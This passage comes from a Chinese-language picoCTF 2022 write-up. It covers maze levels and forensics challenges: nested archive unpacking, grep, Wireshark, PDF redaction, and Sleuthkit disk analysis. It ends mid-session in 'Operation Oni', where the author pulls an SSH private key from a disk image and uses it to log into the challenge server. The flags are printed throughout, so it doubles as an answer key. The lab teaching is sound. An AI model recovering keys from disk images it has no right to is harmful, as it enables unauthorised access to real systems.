.&lt;.          ####.  ..###..             
...          ...#.. .#...#.             
...          .@.#.....###..             
             ..&gt;#.. .#...#.             
             ####.  ..###..             
                ..  .......             
                    .......
</code></pre></div></div>

<p>level 5:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>########################
#&lt;.............#.......#
#..............#.#...#.#
#..............#.#...#.#
#..............#.#####.#
#..............#.....#.#
#..............#.....#.#           
#..............#.......#           
#..............#.......#           
########################           




            @


################         
#..............#
#..............#
#..............#
#..............#
#..............#
#..............#
#..............#
#.............&gt;#
################
</code></pre></div></div>

<p>level 6:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>.......
.&lt;.....
.......
.......
.......
.......
.......
.......
.......
..@....             
.......
.....&gt;.             
.......             
#######             
.......             
.#...#.             
.#...#.
.#####.
.....#.
.....#.
.......
.......
</code></pre></div></div>

<p>level 7:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>...
.&lt;.........
...........
...      ..
         ..
         ..
         ..
         ..
         ..
         ..
   ......@.......   
   ..##########..   
   .#          #.   
   .#  ....... #.
   .#  ..###.. #.
   .#  .#...#. #.
   .#  .#####. #.
   .#  .#...#. #.
   .#  .#...#. #.
   .#  ....... #.
   .#  ....... #.
   .#          #.
   ..##########..
   .............&gt;
</code></pre></div></div>

<p>level 8:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#########################
#&lt;#......#.#.......###..#
#.#.###..#.#.......##..##
#.#.#.#..#.#.......#..###
#.#.#.#..#.#.......#...##
#...#....#..#......#....#
#.######.##..###.###....#
#.#.....................#
#.###.#################.#
#.......................#
#########.###.#########.#  
#.......#.#.#.#.........#  
#.####..#.#...#.#########  
#.#...#.#.#.#.#.........#  
#.#...@.#.#.#.#########.#  
#.#...#.#.#.#.#.........#  
#.####..#.#.#.#.#########  
#.......#.#.#.#.........#  
#.......#.#.#.#########.#  
#########. .#.#...#...#.#  
#...........#.#.#.#.#.#.#  
######## . .#.#.#.#.#.#.#  
#.......#...#.#.#.#.#.#.#  
####.### ...#.#.#.#.#.#.#  
##..........#.#.#.#.#.#.#  
#.#..####...#.#.#.#.#.#.#  
#..#....#####.#.#.#.#.#.#  
#...#...#...#.#.#...#...#  
#....#........#.#########  
#...........#.#........&gt;#   
########################.
</code></pre></div></div>

<p>level 9(这个比较坑, 因为一开始屏幕不够宽, 所以没有看到)</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>...                                                                                          .......
.&lt;.                                                                                          ...#...
...                                                                                          ..#...@
...                                                                                          .####..
                                                                                             .#...#.
                                                                                             ..###..
                                                                                             .......
                                                                                             .......
</code></pre></div></div>

<p>level 10: (这个也很坑, 上面的是一堆东西, 下面也是一堆东西, 
中间的全部都是空白填充, 鬼知道是什么东西. 总之就是非常坑)</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>                                                                                    ################
                                                                                 ####..............#
                                                                                 ####.#####.###....#
                                                                                 ####.#.......#....#
                                                                                 ####.###.....@#...#
                                                                                 ####.#.......#....#
                                                                                 ####.#.....###....#
                                                                                 ####..............#
                                                                                    #..............#
                                                                                    ################
</code></pre></div></div>

<p>目前猜出的就只有这些, 但是我错了, 不对啊. 
<code class="language-plaintext highlighter-rouge">picoCTF{ur_4_wlz4rd_4844AD6F}</code></p>

<p>可恶.</p>

<p>(这一次的是<code class="language-plaintext highlighter-rouge">edit2</code>)</p>

<h4 id="啊-眼神问题">啊, 眼神问题</h4>
<p><code class="language-plaintext highlighter-rouge">picoCTF{ur_4_w1z4rd_4844AD6F}</code></p>

<p>好了. 解决问题. 就这也能叫Wizardlike? 嘿嘿嘿, 
有谁记得攻壳机动队里面少佐(还是笑面男? )是超Wizard级的黑客.</p>

<h2 id="forensics">Forensics</h2>
<h3 id="enhance">Enhance!</h3>
<p>这道题得到的是一个svg图片, 可惜我对这种东西不是很会啊.</p>

<p>好吧. 一开始我做的时候没注意, 只看见了一个大大的圆盘, 
现在重新看的时候发现里面竟然还有一些小小的文字… 妙啊.</p>

<p>那还是介绍我原来的思路吧: 就是我在svg代码里面发现了一堆的文字, 
然后把那些文字给拼起来. 现在想想, 好粗暴啊…</p>

<blockquote>
  <p>坦白来说不太会, 但是蒙呗. 
看到文件里面有一些奇怪的字眼和像是flag的问题, 
合起来试试: 
<code class="language-plaintext highlighter-rouge">picoCTF{3nh4nc3d_d0a757bf}</code></p>

  <p>不出意外的成功了.</p>
</blockquote>

<h3 id="file-types">File types</h3>
<p>这个问题怎么说呢, 是一个考验耐心的问题吧? 也许我的方法太差了, 
可能有更好的方法来解决这个问题.</p>

<p>题目给了一个<code class="language-plaintext highlighter-rouge">Flag.pdf</code></p>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&gt;</span> file Flag.pdf
Flag.pdf: shell archive text
</code></pre></div></div>

<p>哼, 这个东西肯定是乱改文件后缀名让文件无法被正确识别而已.
也就是一个<code class="language-plaintext highlighter-rouge">shell</code>脚本啦. 扔到虚拟机里面运行, 得到了一个flag文件. 
太怪了, 这个是一个压缩文件…</p>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&gt;</span> file flag
flag: current ar archive
</code></pre></div></div>

<p>不理解. 去<a href="https://en.wikipedia.org/wiki/Ar_(Unix)">网上</a>找, 
然后发现了一个<code class="language-plaintext highlighter-rouge">ar</code>命令, 然后在<code class="language-plaintext highlighter-rouge">man</code>里面看看:</p>

<div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code>NAME
     ar – create and maintain library archives

SYNOPSIS
     ar -d [-TLsv] archive file ...
     ar -m [-TLsv] archive file ...
     ar -m [-abiTLsv] position archive file ...
     ar -p [-TLsv] archive [file ...]
     ar -q [-cTLsv] archive file ...
     ar -r [-cuTLsv] archive file ...
     ar -r [-abciuTLsv] position archive file ...
     ar -t [-TLsv] archive [file ...]
     ar -x [-ouTLsv] archive [file ...]
</code></pre></div></div>

<p>嗯, 然后就照猫画虎:</p>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&gt;</span> ar <span class="nt">-x</span> flag
</code></pre></div></div>

<p>嗯, 然后得到了新的flag文件, 结果出现的不是flag内容, 
而是一个新的…</p>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&gt;</span> file flag
flag: cpio archive
</code></pre></div></div>

<p>嗯, 可恶. 再来<a href="https://en.wikipedia.org/wiki/Cpio">查找</a>, 
然后是<code class="language-plaintext highlighter-rouge">man</code>里面的帮助文档:</p>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>NAME
     cpio – copy files to and from archives

SYNOPSIS
     cpio <span class="nt">-i</span> <span class="o">[</span>options] <span class="o">[</span>pattern ...] <span class="o">[</span>&lt; archive]
     cpio <span class="nt">-o</span> <span class="o">[</span>options] &lt; name-list <span class="o">[&gt;</span> archive]
     cpio <span class="nt">-p</span> <span class="o">[</span>options] dest-dir &lt; name-list
</code></pre></div></div>

<p>维基百科上的例子:</p>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&gt;</span> cpio <span class="nt">-i</span> <span class="nt">-d</span> /etc/fstab &lt; archive.cpio
</code></pre></div></div>

<p>于是照猫画虎. 虽然过程中出现了一个小小的尴尬, 因为这个flag
文件和里面的压缩的文件重名了, 所以要把它重命名了:</p>
<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&gt;</span> file flag 
flag: cpio archive
<span class="o">&gt;</span> cpio <span class="nt">-i</span> &lt; flag   
cpio: flag not created: newer or same age version exists
2 blocks
<span class="o">&gt;</span> <span class="nb">mv </span>flag archive
<span class="o">&gt;</span> cpio <span class="nt">-i</span> &lt; archive 
2 blocks
<span class="o">&gt;</span> <span class="nb">ls
</span>archive  flag
<span class="o">&gt;</span> file flag
flag: bzip2 compressed data, block size <span class="o">=</span> 900k
</code></pre></div></div>

<p>我: ?????? 还是压缩包, 这是要压缩几层才能罢休呢?</p>

<div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code>NAME
       bzip2, bunzip2 - a block-sorting file compressor, v1.0.8
       bzcat - decompresses files to stdout
       bzip2recover - recovers data from damaged bzip2 files

SYNOPSIS
       bzip2 [ -cdfkqstvzVL123456789 ] [ filenames ...  ]
       bunzip2 [ -fkvsVL ] [ filenames ...  ]
       bzcat [ -s ] [ filenames ...  ]
       bzip2recover filename

</code></pre></div></div>

<p>然后最后在<a href="https://www.thomas-krenn.com/en/wiki/Archive_under_Linux_(tar,_gz,_bz2,_zip)#bz2.2C_bzw._bzip2">网上</a>得到解压的方法, 就直接看操作吧:</p>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&gt;</span> bunzip2 flag
bunzip2: Can<span class="s1">'t guess original name for flag -- using flag.out
</span></code></pre></div></div>

<p>坏了, 还想着秀操作的来着.</p>

<div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code>       If the file does not end in one of the recognised endings, .bz2, .bz,
       .tbz2 or .tbz, bzip2 complains that it cannot guess the name of the
       original file, and uses the original name with .out appended.
</code></pre></div></div>

<p>呃, 好吧. 不管怎样, 有一个东西输出了就好了:</p>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&gt;</span> <span class="nb">ls
</span>archive  flag.out
<span class="o">&gt;</span> file flag.out 
flag.out: <span class="nb">gzip </span>compressed data, was <span class="s2">"flag"</span>, last modified: Tue Mar 15 06:50:41 2022, from Unix, original size modulo 2^32 326
</code></pre></div></div>

<p>该死, 那么应该再接触一下gzip的格式. (不过前面的网站里面有介绍了, 
直接上)</p>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&gt;</span> <span class="nb">mv </span>flag.out flag.gz
<span class="o">&gt;</span> <span class="nb">gunzip </span>flag.gz
<span class="o">&gt;</span> <span class="nb">ls</span> <span class="nt">-1</span>
archive
flag
<span class="o">&gt;</span> file flag   
flag: lzip compressed data, version: 1
</code></pre></div></div>

<p>要耐心…</p>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&gt;</span> lzip <span class="nt">-d</span> flag 
<span class="o">&gt;</span> <span class="nb">ls
</span>archive flag.out
<span class="o">&gt;</span> file flag
flag.out: LZ4 compressed data <span class="o">(</span>v1.4+<span class="o">)</span>
</code></pre></div></div>

<p>man的介绍:</p>

<div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code>NAME
       lz4 - lz4, unlz4, lz4cat - Compress or decompress .lz4 files

SYNOPSIS
       lz4 [OPTIONS] [-|INPUT-FILE] OUTPUT-FILE

       unlz4 is equivalent to lz4 -d
</code></pre></div></div>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&gt;</span> lz4 <span class="nt">-d</span> flag.out flag
flag.out             : decoded 263 bytes   
<span class="o">&gt;</span> <span class="nb">ls                  
</span>archive  flag  flag.out
<span class="o">&gt;</span> file flag    
flag: LZMA compressed data, non-streamed, size 253
<span class="o">&gt;</span> <span class="nb">mv </span>flag flag.lzma
<span class="o">&gt;</span> lzma <span class="nt">-d</span> flag.lzma
<span class="o">&gt;</span> <span class="nb">ls               
</span>archive  flag  flag.out
<span class="o">&gt;</span> file flag
flag: lzop compressed data - version 1.040, LZO1X-1, os: Unix
<span class="o">&gt;</span> <span class="nb">mv </span>flag flag.lzo
<span class="o">&gt;</span> lzop <span class="nt">-d</span> flag.lzo
<span class="o">&gt;</span> <span class="nb">ls              
</span>archive  flag  flag.lzo  flag.out
<span class="o">&gt;</span> file flag
flag: lzip compressed data, version: 1
<span class="o">&gt;</span> <span class="nb">rm </span>flag.out
<span class="o">&gt;</span> lzip <span class="nt">-d</span> flag
<span class="o">&gt;</span> file flag.out 
flag.out: XZ compressed data
<span class="o">&gt;</span> <span class="nb">mv </span>flag.out flag.xz
<span class="o">&gt;</span> unxz flag.xz
<span class="o">&gt;</span> <span class="nb">ls          
</span>archive  flag  flag.lzo
<span class="o">&gt;</span> file flag   
flag: ASCII text
<span class="o">&gt;</span> <span class="nb">cat </span>flag
7069636f4354467b66316c656e406d335f6d406e3170756c407431306e5f
6630725f3062326375723137795f39353063346665657d0a
</code></pre></div></div>

<p>这是什么? 猜测是ascii码的十六进制表示. 好的.</p>

<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">s</span> <span class="o">=</span> <span class="s2">"7069636f4354467b66316c656e406d335f6d406e3170756c407431306e5f"</span><span class="p">\</span>
    <span class="s2">"6630725f3062326375723137795f39353063346665657d0a"</span>
<span class="n">i</span> <span class="o">=</span> <span class="mi">0</span>
<span class="k">while</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">s</span><span class="p">.</span><span class="nf">length</span>
  <span class="nb">print</span> <span class="n">s</span><span class="p">[</span><span class="n">i</span><span class="o">..</span><span class="p">(</span><span class="n">i</span><span class="o">+</span><span class="mi">1</span><span class="p">)].</span><span class="nf">to_i</span><span class="p">(</span><span class="mi">16</span><span class="p">).</span><span class="nf">chr</span>
  <span class="n">i</span> <span class="o">+=</span> <span class="mi">2</span>
<span class="k">end</span>
<span class="c1"># =&gt; picoCTF{f1len@m3_m@n1pul@t10n_f0r_0b2cur17y_950c4fee}</span>
</code></pre></div></div>

<p>终于啊.</p>

<p>总而言之, 这个题目不难, 但是很麻烦. (估计这就是为什么在平台上, 
这个题的好评度超级低… )做到后面之后完全没有耐心了.</p>

<p>不过好处是让我知道了很多的压缩格式以及对应的处理方法. 
也算是学习到好东西了. 有意思.</p>

<h3 id="lookey-here">Lookey here</h3>
<p>题目的描述里面就已经给了很多的提示了:</p>

<blockquote>
  <p>Attackers have hidden information in a very large mass
of data in the past, maybe they are still doing it.</p>
</blockquote>

<p>所以一行命令解决:</p>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&gt;</span> <span class="nb">cat </span>anthem.flag.txt|grep pico
      we think that the men of picoCTF<span class="o">{</span>gr3p_15_@w3s0m3_2116b979<span class="o">}</span>
</code></pre></div></div>

<p>或者用Ruby来:</p>

<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="no">File</span><span class="p">.</span><span class="nf">open</span><span class="p">(</span><span class="s2">"anthem.flag.txt"</span><span class="p">,</span> <span class="s2">"r"</span><span class="p">).</span><span class="nf">read</span><span class="p">.</span><span class="nf">match</span><span class="p">(</span><span class="sr">/picoCTF\{.+\}/</span><span class="p">)</span>
<span class="c1"># =&gt; #&lt;MatchData "picoCTF{gr3p_15_@w3s0m3_2116b979}"&gt;</span>
</code></pre></div></div>

<h3 id="packets-primer">Packets Primer</h3>
<p>就是网页数据包的捕获的一个分析.</p>

<p>首先介绍一下这个分析软件: 
<a href="https://www.wireshark.org">wireshark</a>, 
这个软件的作用就是分析数据包, 比如说你在网上冲浪的时候, 
你的电脑会和服务器之间相互传递信息, 这些信息是以数据包的
形式来传递的. 假如我们在中间截取(窃听)了通信, 就可以得到
你们沟通的数据包. 然后通过分析你的数据包, 我们没准就可以
知道你在访问什么不得了的网站或者发送(下载)不得了的信息.</p>

<p>原理是这样, 操作上不太会. 因为之前都没有用过, 并且, 
据说这种东西本来应该是用filter来做才能够发挥功能的, 
但是我做的时候都是人眼filter的. 太low了.</p>

<p>虽然但是, 这道问题里面的操作实在是太简单了. 
打开软件, 读取文件内容, 然后随便看看每一个数据包, 结果, 
假如眼尖的话, 就看见了:</p>

<p><img src="/_img/picoctf2022/packets_primer.png" alt="screenshoot" title="see?" /></p>

<p>The answer is blowing in the wind.</p>

<h3 id="redaction-gone-wrong">Redaction gone wrong</h3>
<p>就是一个类似于SCP文件的pdf文件, 但是实际上原理就跟Photoshop
里面图层遮盖的想法是一样的, 所以用Photoshop, (或者类似的, 
GIMP也行)打开, 然后把黑色矩形的去掉就好了.</p>

<p>(后来想想, 还是直接在文字图层里面复制比较好, 手打的话, 
会打错… )</p>

<h3 id="sleuthkit-intro--apprentice">Sleuthkit Intro &amp; Apprentice</h3>
<p>类似一套题目, 先是一个教学关卡, 然后再是一个稍微升级一点的小怪. 
所以我就上下段连着介绍了.</p>

<p>首先解压开下载的文件:</p>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&gt;</span> <span class="nb">gunzip </span>disk.img.gz
<span class="o">&gt;</span> <span class="nb">ls
</span>disk.img
<span class="o">&gt;</span> file disk.img 
disk.img: DOS/MBR boot sector<span class="p">;</span> partition 1 : <span class="nv">ID</span><span class="o">=</span>0x83, active, start-CHS <span class="o">(</span>0x0,32,33<span class="o">)</span>, end-CHS <span class="o">(</span>0xc,190,50<span class="o">)</span>, startsector 2048, 202752 sectors
</code></pre></div></div>

<p>完全不会啊, 我的天.</p>

<p>然后查看了Hints: 让我使用<code class="language-plaintext highlighter-rouge">mmls</code>来解决. 查找之后才知道这个是来自
<code class="language-plaintext highlighter-rouge">sleuthkit</code>软件包的工具, 哇, 和题目名字一毛一样诶. 好的, 有提示了.</p>

<p>安装软件包的方法, 在mac上面直接用homebrew就好了, 或者linux上, 
用相应的包管理器就好了. 我觉得没啥问题.</p>

<p>Intro的题目非常的简单, 类似于打开计算机的难度, 就是问问你磁盘的大小. 
用<code class="language-plaintext highlighter-rouge">mmls</code>命令就可以解决问题啦.</p>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&gt;</span> mmls disk.img
DOS Partition Table
Offset Sector: 0
Units are <span class="k">in </span>512-byte sectors

      Slot      Start        End          Length       Description
000:  Meta      0000000000   0000000000   0000000001   Primary Table <span class="o">(</span><span class="c">#0)</span>
001:  <span class="nt">-------</span>   0000000000   0000002047   0000002048   Unallocated
002:  000:000   0000002048   0000204799   0000202752   Linux <span class="o">(</span>0x83<span class="o">)</span>
</code></pre></div></div>

<p>好吧, 好吧, 回去看了一眼题目, 没想到它真的不难, 
问题是如何得到Linux的分区的大小, 然后, 小学数学题了属于是, 
End - Start + 1 = 202752.</p>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&gt;</span> nc saturn.picoctf.net 52279
What is the size of the Linux partition <span class="k">in </span>the given disk image?
Length <span class="k">in </span>sectors: 202752
202752
Great work!
picoCTF<span class="o">{</span>mm15_f7w!<span class="o">}</span>
</code></pre></div></div>

<p>解释一下, 在man里面的mmls的说明是这样的:</p>

<blockquote>
  <p>mmls - Display the partition layout of a volume system</p>
</blockquote>

<p>也就是说, 它可以列出磁盘结构. 哇唔. 妙啊. 
(其实我后来知道, 这个是需要提前检查的, 这个在后面的Appreciate里面, 
我重新去网上看了一段介绍的影片, 真的是, 感觉相关的介绍比较少? 
可能是因为我的打开方式不太对. )</p>

<p>下面是针对skleuthkit的一般操作方式:</p>

<p>首先是检查disk文件的磁盘类型:</p>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&gt;</span> img_stat disk.flag.img
IMAGE FILE INFORMATION
<span class="nt">--------------------------------------------</span>
Image Type: raw

Size <span class="k">in </span>bytes: 314572800
Sector size:	512
</code></pre></div></div>

<p><code class="language-plaintext highlighter-rouge">img_stat</code>的命令可以将磁盘镜像的一些基本信息输出出来. 
在上面的<code class="language-plaintext highlighter-rouge">Image Type</code>就说明是一种<code class="language-plaintext highlighter-rouge">raw</code>, 据视频介绍, 
对于这种类型的磁盘, 可以使用<code class="language-plaintext highlighter-rouge">mmls</code>来直接看看这个文件. 
并且需要使用<code class="language-plaintext highlighter-rouge">offset</code>来读取上面的数据, 
而对于<code class="language-plaintext highlighter-rouge">logical</code>类型的, 好像就用不着<code class="language-plaintext highlighter-rouge">offset</code>了. 
(不过我不是很懂, 因为没有遇见过. )</p>

<p>然后使用<code class="language-plaintext highlighter-rouge">mmls</code>可以得到磁盘里面的文件结构. 类似于, 呃, 
想想一堆数据, 这堆数据里面的数据可能是以不同的方式组织的, 
比如常见的<code class="language-plaintext highlighter-rouge">ext4</code>, <code class="language-plaintext highlighter-rouge">fat32</code>之类的.</p>

<p>虽然在以前我还是很热衷于给我的老电脑分盘, 
因为对于机械硬盘的C, D盘, 它们有点区分还是有点用的. 
(但是换上坑爹小小小小小SSD的水果之后, 我就没什么想法了, 
小小一个苹果, 被坑爹的资本家咬了辣么大一口, 剩下的还能怎么分呢? )</p>

<p>例子:</p>
<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&gt;</span> mmls disk.flag.img
DOS Partition Table
Offset Sector: 0
Units are <span class="k">in </span>512-byte sectors

      Slot      Start        End          Length       Description
000:  Meta      0000000000   0000000000   0000000001   Primary Table <span class="o">(</span><span class="c">#0)</span>
001:  <span class="nt">-------</span>   0000000000   0000002047   0000002048   Unallocated
002:  000:000   0000002048   0000206847   0000204800   Linux <span class="o">(</span>0x83<span class="o">)</span>
003:  000:001   0000206848   0000360447   0000153600   Linux Swap / Solaris x86 <span class="o">(</span>0x82<span class="o">)</span>
004:  000:002   0000360448   0000614399   0000253952   Linux <span class="o">(</span>0x83<span class="o">)</span>
</code></pre></div></div>

<p>上面的东西就是一个简单的例子: 上面的可以看到, <code class="language-plaintext highlighter-rouge">Description</code>
里面介绍了类似于分区的一个分区的类型. 而<code class="language-plaintext highlighter-rouge">Start</code>, <code class="language-plaintext highlighter-rouge">End</code>等
就是一个磁盘分区相对于磁盘的开始的一个<code class="language-plaintext highlighter-rouge">offset</code>的位移量. 
之前说过了, 对于<code class="language-plaintext highlighter-rouge">raw</code>类型的, 是利用这些位移量来访问数据的.</p>

<p>为了更加确定文件的类型, 可以用<code class="language-plaintext highlighter-rouge">fsstat</code>来检查:</p>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&gt;</span> fsstat <span class="nt">-o</span> 2048 disk.flag.img
FILE SYSTEM INFORMATION
<span class="nt">--------------------------------------------</span>
File System Type: Ext4
Volume Name: 
Volume ID: 8e023955b4e7dab7e04b7643076ccf0f

Last Written at: 2021-09-30 02:10:02 <span class="o">(</span>CST<span class="o">)</span>
Last Checked at: 2021-09-29 23:57:16 <span class="o">(</span>CST<span class="o">)</span>

Last Mounted at: 2021-09-30 02:06:00 <span class="o">(</span>CST<span class="o">)</span>
Unmounted properly
Last mounted on: /mnt/boot

Source OS: Linux
Dynamic Structure
Compat Features: Journal, Ext Attributes, Resize Inode, Dir Index
InCompat Features: Filetype, Extents, Flexible Block Groups, 
Read Only Compat Features: Sparse Super, Large File, Huge File, Extra Inode Size

Journal ID: 00
Journal Inode: 8

METADATA INFORMATION
<span class="nt">--------------------------------------------</span>
...
</code></pre></div></div>

<p>嗯, 大概就是这样. 可以看见里面的<code class="language-plaintext highlighter-rouge">File System Type</code>之类的类型, 
就是文件系统的类型. 这里是<code class="language-plaintext highlighter-rouge">ext4</code>, 为什么一定要确认呢? 
这是为了让之后的操作里面, 哪怕是出现了一些不能够自动识别的情况, 
那么就可以通过人为强行指定文件类型的方式来满足操作.</p>

<p>(其实上面的做法是没什么必要的, 写了那么多之后我觉得好无聊啊, 
并且我也觉得没什么鸟用, 里面没写什么高级的东西, 所以我, 
怎么说呢, 本来打算删掉, 但是都码了这么多字了, 删掉有点可惜… )</p>

<p>(废话太多啦!!!! )</p>

<p>接下去一定更加实际一点. <code class="language-plaintext highlighter-rouge">fls</code>和<code class="language-plaintext highlighter-rouge">icat</code>命令估计就是我最常用的东西了, 
这两个命令的功能和<code class="language-plaintext highlighter-rouge">ls</code>以及<code class="language-plaintext highlighter-rouge">cat</code>是十分对应的. 具体的用法也差不多: 
都是: <strong>命令 -o 磁盘的开始offset 磁盘文件 [磁盘文件上的位移]</strong>.</p>

<p>比如:</p>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&gt;</span> fls <span class="nt">-o</span> 2048 disk.flag.img
d/d 11:	lost+found
r/r 12:	ldlinux.sys
r/r 13:	ldlinux.c32
r/r 15:	config-virt
r/r 16:	vmlinuz-virt
r/r 17:	initramfs-virt
l/l 18:	boot
r/r 20:	libutil.c32
r/r 19:	extlinux.conf
r/r 21:	libcom32.c32
r/r 22:	mboot.c32
r/r 23:	menu.c32
r/r 14:	System.map-virt
r/r 24:	vesamenu.c32
V/V 25585:	<span class="nv">$OrphanFiles</span>
</code></pre></div></div>

<p>这样就相当于列出了linux根目录上面的文件夹内容. 
现在看到的文件内容不是很熟悉, 因为这个不是我想要找的分区, 
所以换一个分区, 然后可以看到:</p>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&gt;</span> fls <span class="nt">-o</span> 360448 disk.flag.img
d/d 451:	home
d/d 11:	lost+found
d/d 12:	boot
d/d 1985:	etc
d/d 1986:	proc
d/d 1987:	dev
d/d 1988:	tmp
d/d 1989:	lib
d/d 1990:	var
d/d 3969:	usr
d/d 3970:	bin
d/d 1991:	sbin
d/d 1992:	media
d/d 1993:	mnt
d/d 1994:	opt
d/d 1995:	root
d/d 1996:	run
d/d 1997:	srv
d/d 1998:	sys
d/d 2358:	swap
V/V 31745:	<span class="nv">$OrphanFiles</span>
</code></pre></div></div>

<p>随便逛逛, 比如说去看看root文件夹里面的东西, 
因为root文件夹相对当前的磁盘开始位置的位移是<code class="language-plaintext highlighter-rouge">1995</code>, 
正如你所看见的. 所以加上位移, 我们就能访问文件啦:</p>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&gt;</span> fls <span class="nt">-o</span> 360448 disk.flag.img 1995
r/r 2363:	.ash_history
d/d 3981:	my_folder
</code></pre></div></div>

<p>呃, 一个有意思的文件夹. 
(注: 如何知道里面显示的东西是啥呢, 其实很简单, 
前面有一个标注: <code class="language-plaintext highlighter-rouge">r/r</code>表示是可以读的文件, 
<code class="language-plaintext highlighter-rouge">d/d</code>表示是文件夹, 然后一些带星号的是被删除的文件. )</p>

<p>(当时我没有一个看历史文件的想法, 但是看看历史文件
<code class="language-plaintext highlighter-rouge">.ash_history</code>可以知道用户在这个终端里面干了什么的. )</p>

<p>直接打开<code class="language-plaintext highlighter-rouge">my_folder</code>, 发现里面有一个叫做<code class="language-plaintext highlighter-rouge">flag.txt</code>的东西, 
那么用<code class="language-plaintext highlighter-rouge">icat</code>输出就可以看到内容了:</p>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&gt;</span> fls <span class="nt">-o</span> 360448 disk.flag.img 3981
r/r <span class="k">*</span> 2082<span class="o">(</span>realloc<span class="o">)</span>:	flag.txt
r/r 2371:	flag.uni.txt
<span class="o">&gt;</span> icat <span class="nt">-o</span> 360448 disk.flag.img 2371
picoCTF<span class="o">{</span>by73_5urf3r_2f22df38<span class="o">}</span>
</code></pre></div></div>

<p>注: 这样的工作有什么意义呢? 比如说有一个人通过<code class="language-plaintext highlighter-rouge">dd</code>命令备份了你的硬盘, 
然后通过这样的方式来就可以分析你的硬盘里面有什么数据. 
好像这样的技术就叫做取证技术.</p>

<h3 id="operation-oni">Operation Oni</h3>
<p>嘿, 前面的技术刚好可以使用了. 这次的题目要求我们从磁盘中提取出
ssh的key file, 然后连接到服务器上得到flag.</p>

<p>稍微介绍一下, 这个key file顾名思义, 就是一种类似于密码的东西, 
为了保证服务器的安全, 一般来说登陆服务器都需要密匙. 对于密钥, 
一般来说, 你肯定不会想让别人知道的. 所以这个题目的情况就像是, 
你的电脑磁盘被间谍拷贝了一份, 多么危险啊…</p>

<p>用上面介绍的sleuthkit来解决问题:</p>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&gt;</span> mmls disk.img
DOS Partition Table
Offset Sector: 0
Units are <span class="k">in </span>512-byte sectors

      Slot      Start        End          Length       Description
000:  Meta      0000000000   0000000000   0000000001   Primary Table <span class="o">(</span><span class="c">#0)</span>
001:  <span class="nt">-------</span>   0000000000   0000002047   0000002048   Unallocated
002:  000:000   0000002048   0000206847   0000204800   Linux <span class="o">(</span>0x83<span class="o">)</span>
003:  000:001   0000206848   0000471039   0000264192   Linux <span class="o">(</span>0x83<span class="o">)</span>
<span class="o">&gt;</span> fls <span class="nt">-o</span> 206848 disk.img
d/d 458:	home
d/d 11:	lost+found
d/d 12:	boot
d/d 13:	etc
d/d 79:	proc
d/d 80:	dev
d/d 81:	tmp
d/d 82:	lib
d/d 85:	var
d/d 94:	usr
d/d 104:	bin
d/d 118:	sbin
d/d 464:	media
d/d 468:	mnt
d/d 469:	opt
d/d 470:	root
d/d 471:	run
d/d 473:	srv
d/d 474:	sys
V/V 33049:	<span class="nv">$OrphanFiles</span>
<span class="o">&gt;</span> fls <span class="nt">-o</span> 206848 disk.img 470
r/r 2344:	.ash_history
d/d 3916:	.ssh
<span class="o">&gt;</span> fls <span class="nt">-o</span> 206848 disk.img 3916
r/r 2345:	id_ed25519
r/r 2346:	id_ed25519.pub
<span class="o">&gt;</span> icat <span class="nt">-o</span> 206848 disk.img 2345 <span class="o">&gt;</span> id_ed25519
<span class="o">&gt;</span> <span class="nb">chmod </span>600 id_ed25519
<span class="o">&gt;</span> ssh <span class="nt">-i</span> id_ed25519 <span class="nt">-p</span> 56167 ctf-player@saturn.picoctf.net
The authenticity of host <span class="s1">'[saturn.picoctf.net]:56167 ([18.217.86.78]:56167)'</span> can<span class="s1">'t be established.
ED25519 key fingerprint is SHA256:5gIm/EJ9bYnoH4qed83W5HXLfN1DO55849f6Lze0lx8.
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:13: [saturn.picoctf.net]:59808
